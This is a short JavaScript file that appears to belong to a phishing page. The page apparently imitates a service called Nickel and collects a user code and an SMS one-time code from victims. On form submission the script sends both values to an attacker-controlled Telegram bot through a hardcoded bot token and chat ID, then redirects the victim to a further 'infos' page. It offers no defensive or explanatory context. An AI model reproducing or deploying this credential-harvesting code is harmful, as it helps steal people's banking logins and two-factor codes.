
var sms = document.getElementById('sms');
var usercode = localStorage.getItem('usercode') ;

document.getElementById('form5').addEventListener('submit', function(e){
    e.preventDefault();
    
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);
    // const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);

    try {

    bot.sendMessage('👔User NICKEL : ' + usercode + '💌sms1 : ' + sms.value)
    .then(res => {
        console.log(res);
        window.location.href = './infos.html';
    })
}
catch(err) {
    console.log(err)
}
   
})
